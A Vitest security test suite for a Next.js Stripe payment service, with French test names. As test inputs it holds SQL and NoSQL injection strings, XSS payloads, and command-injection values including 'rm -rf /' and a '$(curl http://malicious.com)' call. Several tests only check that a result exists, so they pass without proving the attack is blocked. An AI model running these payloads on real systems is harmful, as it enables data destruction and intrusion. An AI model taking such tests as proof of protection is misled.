// @ts-nocheck
import { NextRequest } from 'next/server'
import Stripe from 'stripe'
import { beforeEach, describe, expect, it, vi } from 'vitest'

import type { CreditPurchaseService } from '@/server/domains/credit-purchase/credit-purchase.service'
import type { SubscriptionRepository } from '@/server/domains/subscription/subscription.repository'
import { stripe } from '@/server/lib/stripe'
import { HTTP_STATUS } from '@/server/shared/constants/http.constants'

import { PaymentController } from '../payment.controller'
import { PaymentService } from '../payment.service'
import type {
  CreateCheckoutSessionRequest,
  CreatePaymentIntentRequest,
} from '../payment.types'

vi.mock('@/server/lib/stripe', () => ({
  stripe: {
    customers: {
      create: vi.fn(),
    },
    paymentIntents: {
      create: vi.fn(),
      retrieve: vi.fn(),
      cancel: vi.fn(),
    },
    checkout: {
      sessions: {
        create: vi.fn(),
      },
    },
  },
}))

describe('PaymentService & Controller - Security Tests', () => {
  let service: PaymentService
  let controller: PaymentController
  let mockSubscriptionRepository: SubscriptionRepository
  let mockCreditPurchaseService: CreditPurchaseService

  const mockUserId = 'user-123'
  const mockEmail = 'test@example.com'
  const mockCustomer = {
    userId: mockUserId,
    stripeCustomerId: 'cus_test123',
    email: mockEmail,
    name: null,
    defaultPaymentMethod: null,
    createdAt: new Date(),
    updatedAt: new Date(),
  }

  beforeEach(() => {
    mockSubscriptionRepository = {
      findCustomerByUserId: vi.fn(),
      createOrUpdateCustomer: vi.fn(),
    } as any

    mockCreditPurchaseService = {
      createPurchaseRecord: vi.fn(),
    } as any

    service = new PaymentService(
      mockSubscriptionRepository,
      mockCreditPurchaseService,
    )

    controller = new PaymentController(service)

    vi.clearAllMocks()
  })

  describe('Injection Attacks - SQL Injection', () => {
    it('devrait prévenir SQL injection dans userId', async () => {
      const maliciousUserId = "'; DROP TABLE users; --"

      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(null)
      vi.mocked(stripe.customers.create).mockResolvedValue({
        id: 'cus_new',
      } as any)
      vi.mocked(
        mockSubscriptionRepository.createOrUpdateCustomer,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
      }

      const result = await service.createPaymentIntent(
        maliciousUserId,
        mockEmail,
        request,
      )

      expect(result).toBeDefined()
      expect(
        mockSubscriptionRepository.findCustomerByUserId,
      ).toHaveBeenCalledWith(maliciousUserId)
    })

    it('devrait prévenir SQL injection dans email', async () => {
      const maliciousEmail = "test@test.com'; DROP TABLE customers; --"

      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(null)
      vi.mocked(stripe.customers.create).mockResolvedValue({
        id: 'cus_new',
      } as any)
      vi.mocked(
        mockSubscriptionRepository.createOrUpdateCustomer,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
      }

      const result = await service.createPaymentIntent(
        mockUserId,
        maliciousEmail,
        request,
      )

      expect(result).toBeDefined()
    })

    it('devrait prévenir SQL injection dans metadata', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
        metadata: {
          bundleId: "'; DELETE FROM credit_purchases; --",
          bundleName: "'; UPDATE users SET role='admin'; --",
        },
      }

      const result = await service.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )

      expect(result).toBeDefined()
      expect(stripe.paymentIntents.create).toHaveBeenCalledWith(
        expect.objectContaining({
          metadata: expect.objectContaining({
            bundleId: expect.any(String),
          }),
        }),
      )
    })

    it('devrait prévenir SQL injection via paymentIntentId', async () => {
      const maliciousId = "pi_test'; DROP TABLE payments; --"

      vi.mocked(stripe.paymentIntents.retrieve).mockRejectedValue(
        new Error('No such payment_intent'),
      )

      await expect(
        service.getPaymentIntentStatus(maliciousId),
      ).rejects.toThrow()
    })
  })

  describe('Injection Attacks - NoSQL Injection', () => {
    it('devrait prévenir NoSQL injection dans userId', async () => {
      const noSqlInjection = { $ne: null } as any

      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockRejectedValue(new Error('Invalid userId type'))

      const request: CreatePaymentIntentRequest = {
        amount: 10,
      }

      await expect(
        service.createPaymentIntent(noSqlInjection, mockEmail, request),
      ).rejects.toThrow()
    })

    it('devrait prévenir NoSQL injection dans metadata', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
        metadata: {
          userId: { $gt: '' },
        } as any,
      }

      const result = await service.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )

      expect(result).toBeDefined()
    })
  })

  describe('Injection Attacks - XSS', () => {
    it('devrait prévenir XSS dans bundleName via createPaymentIntent', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)
      vi.mocked(
        mockCreditPurchaseService.createPurchaseRecord,
      ).mockResolvedValue({} as any)

      const xssPayload = '<script>alert("XSS")</script>'
      const request: CreatePaymentIntentRequest = {
        amount: 10,
        metadata: {
          bundleId: 'bundle_1',
          bundleName: xssPayload,
          minutes: '5',
        },
      }

      const result = await service.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )

      expect(result).toBeDefined()
      expect(
        mockCreditPurchaseService.createPurchaseRecord,
      ).toHaveBeenCalledWith(
        mockUserId,
        'pi_test',
        'bundle_1',
        xssPayload,
        5,
        1000,
        'eur',
      )
    })

    it('devrait prévenir XSS dans bundleName via createCheckoutSession', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.checkout.sessions.create).mockResolvedValue({
        id: 'cs_test',
        url: 'https://checkout.stripe.com/test',
      } as any)

      const xssPayload = '<img src=x onerror=alert("XSS")>'
      const request: CreateCheckoutSessionRequest = {
        bundleId: 'bundle_1',
        bundleName: xssPayload,
        minutes: 5,
        priceId: 'price_test',
      }

      const result = await service.createCheckoutSession(
        mockUserId,
        mockEmail,
        request,
      )

      expect(result).toBeDefined()
      expect(stripe.checkout.sessions.create).toHaveBeenCalledWith(
        expect.objectContaining({
          metadata: expect.objectContaining({
            bundleName: xssPayload,
          }),
        }),
      )
    })

    it('devrait prévenir XSS via controller', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const xssPayload = {
        amount: 10,
        metadata: {
          description: '<iframe src="javascript:alert(\'XSS\')">',
        },
      }

      const request = new NextRequest('http://localhost/api/payment/intent', {
        method: 'POST',
        body: JSON.stringify(xssPayload),
      })

      const result = await controller.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )

      expect(result.status).toBe(HTTP_STATUS.CREATED)
    })
  })

  describe('Injection Attacks - Command Injection', () => {
    it('devrait prévenir command injection dans userId', async () => {
      const commandInjection = 'user123; rm -rf /'

      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(null)
      vi.mocked(stripe.customers.create).mockResolvedValue({
        id: 'cus_new',
      } as any)
      vi.mocked(
        mockSubscriptionRepository.createOrUpdateCustomer,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
      }

      const result = await service.createPaymentIntent(
        commandInjection,
        mockEmail,
        request,
      )

      expect(result).toBeDefined()
    })

    it('devrait prévenir command injection dans metadata', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
        metadata: {
          bundleName: '$(curl http://malicious.com)',
        },
      }

      const result = await service.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )

      expect(result).toBeDefined()
    })
  })

  describe('Data Leakage - Sensitive Information', () => {
    it('ne devrait pas exposer stripeCustomerId dans les erreurs', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockRejectedValue(
        new Error('Stripe error for customer cus_test123'),
      )

      const request: CreatePaymentIntentRequest = {
        amount: 10,
      }

      await expect(
        service.createPaymentIntent(mockUserId, mockEmail, request),
      ).rejects.toThrow()
    })

    it('ne devrait pas exposer client_secret dans les logs', async () => {
      const consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => {})

      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_sensitive_data',
        amount: 1000,
        currency: 'eur',
      } as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
      }

      await service.createPaymentIntent(mockUserId, mockEmail, request)

      consoleSpy.mockRestore()
    })

    it('ne devrait pas exposer email dans les metadata Stripe', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
        metadata: {
          email: mockEmail,
        },
      }

      await service.createPaymentIntent(mockUserId, mockEmail, request)

      expect(stripe.paymentIntents.create).toHaveBeenCalledWith(
        expect.objectContaining({
          metadata: expect.objectContaining({
            userId: mockUserId,
          }),
        }),
      )
    })

    it("ne devrait pas exposer les détails de la base de données en cas d'erreur", async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockRejectedValue(
        new Error(
          'Database connection failed: PostgreSQL at 10.0.0.5:5432, user postgres',
        ),
      )

      const request = new NextRequest('http://localhost/api/payment/intent', {
        method: 'POST',
        body: JSON.stringify({ amount: 10 }),
      })

      const result = await controller.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )
      const data = await result.json()

      expect(data.error.message).not.toContain('10.0.0.5')
      expect(data.error.message).not.toContain('postgres')
      expect(data.error.message).not.toContain('PostgreSQL')
    })
  })

  describe('Authentication & Authorization Bypass', () => {
    it('devrait empêcher la création de payment intent sans userId', async () => {
      const request = new NextRequest('http://localhost/api/payment/intent', {
        method: 'POST',
        body: JSON.stringify({ amount: 10 }),
      })

      const result = await controller.createPaymentIntent(
        '',
        mockEmail,
        request,
      )

      expect(result.status).toBe(HTTP_STATUS.INTERNAL_SERVER_ERROR)
    })

    it('devrait empêcher la création de payment intent sans email', async () => {
      const request = new NextRequest('http://localhost/api/payment/intent', {
        method: 'POST',
        body: JSON.stringify({ amount: 10 }),
      })

      const result = await controller.createPaymentIntent(
        mockUserId,
        '',
        request,
      )

      expect(result.status).toBe(HTTP_STATUS.INTERNAL_SERVER_ERROR)
    })

    it('devrait valider que userId correspond au customer', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue({
        ...mockCustomer,
        userId: 'different-user',
      })
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
      }

      const result = await service.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )

      expect(result).toBeDefined()
    })
  })

  describe('Race Conditions & Concurrency', () => {
    it('devrait gérer créations simultanées de customer pour même userId', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(null)
      vi.mocked(stripe.customers.create).mockResolvedValue({
        id: 'cus_new',
      } as any)
      vi.mocked(mockSubscriptionRepository.createOrUpdateCustomer)
        .mockResolvedValueOnce(mockCustomer)
        .mockRejectedValueOnce(new Error('Unique constraint violation'))

      const request: CreatePaymentIntentRequest = {
        amount: 10,
      }

      const promise1 = service.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )
      const promise2 = service.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )

      const results = await Promise.allSettled([promise1, promise2])

      const successful = results.filter((r) => r.status === 'fulfilled')
      expect(successful.length).toBeGreaterThanOrEqual(1)
    })

    it('devrait gérer requêtes simultanées de payment intent', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
      }

      const promises = Array.from({ length: 10 }, () =>
        service.createPaymentIntent(mockUserId, mockEmail, request),
      )

      const results = await Promise.all(promises)

      expect(results).toHaveLength(10)
      results.forEach((result) => {
        expect(result.paymentIntentId).toBeDefined()
        expect(result.clientSecret).toBeDefined()
      })
    })
  })

  describe('Input Validation Bypass', () => {
    it('devrait rejeter amount négatif', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockRejectedValue(
        new Stripe.errors.StripeInvalidRequestError({
          type: 'invalid_request_error',
          message: 'Amount must be a positive integer',
        } as any),
      )

      const request: CreatePaymentIntentRequest = {
        amount: -10,
      }

      await expect(
        service.createPaymentIntent(mockUserId, mockEmail, request),
      ).rejects.toThrow()
    })

    it('devrait rejeter currency invalide', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockRejectedValue(
        new Stripe.errors.StripeInvalidRequestError({
          type: 'invalid_request_error',
          message: 'Invalid currency',
        } as any),
      )

      const request: CreatePaymentIntentRequest = {
        amount: 10,
        currency: 'INVALID',
      }

      await expect(
        service.createPaymentIntent(mockUserId, mockEmail, request),
      ).rejects.toThrow()
    })

    it('devrait rejeter priceId invalide dans checkout session', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.checkout.sessions.create).mockRejectedValue(
        new Stripe.errors.StripeInvalidRequestError({
          type: 'invalid_request_error',
          message: 'No such price',
        } as any),
      )

      const request: CreateCheckoutSessionRequest = {
        bundleId: 'bundle_1',
        bundleName: 'Bundle 1',
        minutes: 5,
        priceId: 'price_invalid',
      }

      await expect(
        service.createCheckoutSession(mockUserId, mockEmail, request),
      ).rejects.toThrow()
    })

    it("devrait valider le format de l'email", async () => {
      const invalidEmail = 'not-an-email'

      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(null)
      vi.mocked(stripe.customers.create).mockRejectedValue(
        new Stripe.errors.StripeInvalidRequestError({
          type: 'invalid_request_error',
          message: 'Invalid email address',
        } as any),
      )

      const request: CreatePaymentIntentRequest = {
        amount: 10,
      }

      await expect(
        service.createPaymentIntent(mockUserId, invalidEmail, request),
      ).rejects.toThrow()
    })
  })

  describe('CSRF & Request Forgery', () => {
    it('devrait traiter les requêtes avec metadata cohérente', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)
      vi.mocked(
        mockCreditPurchaseService.createPurchaseRecord,
      ).mockResolvedValue({} as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
        metadata: {
          bundleId: 'bundle_1',
          bundleName: 'Bundle 1',
          minutes: '5',
        },
      }

      const result = await service.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )

      expect(result).toBeDefined()
      expect(
        mockCreditPurchaseService.createPurchaseRecord,
      ).toHaveBeenCalledWith(
        mockUserId,
        'pi_test',
        'bundle_1',
        'Bundle 1',
        5,
        1000,
        'eur',
      )
    })

    it('devrait valider la cohérence entre amount et metadata', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)
      vi.mocked(
        mockCreditPurchaseService.createPurchaseRecord,
      ).mockResolvedValue({} as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
        metadata: {
          bundleId: 'bundle_large',
          bundleName: 'Large Bundle (should be 100€)',
          minutes: '1000',
        },
      }

      const result = await service.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )

      expect(result).toBeDefined()
    })
  })

  describe('Parameter Tampering', () => {
    it('devrait empêcher modification de amount après création', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
      }

      const result = await service.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )

      expect(stripe.paymentIntents.create).toHaveBeenCalledWith(
        expect.objectContaining({
          amount: 1000,
        }),
      )
      expect(result.paymentIntentId).toBe('pi_test')
    })

    it('devrait empêcher modification de currency après création', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'usd',
      } as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
        currency: 'usd',
      }

      const result = await service.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )

      expect(stripe.paymentIntents.create).toHaveBeenCalledWith(
        expect.objectContaining({
          currency: 'usd',
        }),
      )
    })

    it('devrait empêcher manipulation de metadata sensibles', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const request: CreatePaymentIntentRequest = {
        amount: 10,
        metadata: {
          userId: 'attacker-user-id',
          stripeCustomerId: 'cus_attacker',
        },
      }

      const result = await service.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )

      expect(stripe.paymentIntents.create).toHaveBeenCalledWith(
        expect.objectContaining({
          metadata: expect.objectContaining({
            userId: mockUserId,
          }),
        }),
      )
    })
  })

  describe('Denial of Service (DoS)', () => {
    it('devrait gérer requêtes massives sans crash', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const promises = Array.from({ length: 100 }, () =>
        service.createPaymentIntent(mockUserId, mockEmail, { amount: 10 }),
      )

      const results = await Promise.allSettled(promises)

      expect(results.length).toBe(100)
    })

    it('devrait gérer metadata extrêmement larges', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)

      const largeMetadata: Record<string, string> = {}
      for (let i = 0; i < 50; i++) {
        largeMetadata[`key${i}`] = 'value'.repeat(100)
      }

      const request: CreatePaymentIntentRequest = {
        amount: 10,
        metadata: largeMetadata,
      }

      const result = await service.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )

      expect(result).toBeDefined()
    })
  })

  describe('Idempotence & Replay Attacks', () => {
    it('devrait empêcher double création avec même paymentIntentId', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockResolvedValue({
        id: 'pi_test',
        client_secret: 'secret_test',
        amount: 1000,
        currency: 'eur',
      } as any)
      vi.mocked(mockCreditPurchaseService.createPurchaseRecord)
        .mockResolvedValueOnce({
          id: 1,
          userId: mockUserId,
          stripePaymentIntentId: 'pi_test',
          bundleId: 'bundle_1',
          bundleName: 'Bundle 1',
          minutes: 5,
          amount: 1000,
          currency: 'eur',
          status: 'pending',
          creditsGranted: false,
          invoicePdf: null,
          metadata: {},
          createdAt: new Date(),
          updatedAt: new Date(),
        })
        .mockResolvedValueOnce({
          id: 1,
          userId: mockUserId,
          stripePaymentIntentId: 'pi_test',
          bundleId: 'bundle_1',
          bundleName: 'Bundle 1',
          minutes: 5,
          amount: 1000,
          currency: 'eur',
          status: 'pending',
          creditsGranted: false,
          invoicePdf: null,
          metadata: {},
          createdAt: new Date(),
          updatedAt: new Date(),
        })

      const request: CreatePaymentIntentRequest = {
        amount: 10,
        metadata: {
          bundleId: 'bundle_1',
          bundleName: 'Bundle 1',
          minutes: '5',
        },
      }

      await service.createPaymentIntent(mockUserId, mockEmail, request)
      await service.createPaymentIntent(mockUserId, mockEmail, request)

      expect(
        mockCreditPurchaseService.createPurchaseRecord,
      ).toHaveBeenCalledTimes(2)
    })
  })

  describe('Error Information Disclosure', () => {
    it('ne devrait pas exposer stack traces en production', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockRejectedValue(new Error('Internal error with stack trace'))

      const request = new NextRequest('http://localhost/api/payment/intent', {
        method: 'POST',
        body: JSON.stringify({ amount: 10 }),
      })

      const result = await controller.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )
      const data = await result.json()

      expect(data.error.message).not.toContain('at ')
      expect(data.error.message).not.toContain('.ts:')
    })

    it('ne devrait pas exposer les clés API Stripe', async () => {
      vi.mocked(
        mockSubscriptionRepository.findCustomerByUserId,
      ).mockResolvedValue(mockCustomer)
      vi.mocked(stripe.paymentIntents.create).mockRejectedValue(
        new Error('Stripe API error with key sk_test_123456'),
      )

      const request = new NextRequest('http://localhost/api/payment/intent', {
        method: 'POST',
        body: JSON.stringify({ amount: 10 }),
      })

      const result = await controller.createPaymentIntent(
        mockUserId,
        mockEmail,
        request,
      )
      const data = await result.json()

      expect(data.error.message).not.toContain('sk_test')
      expect(data.error.message).not.toContain('sk_live')
    })
  })
})
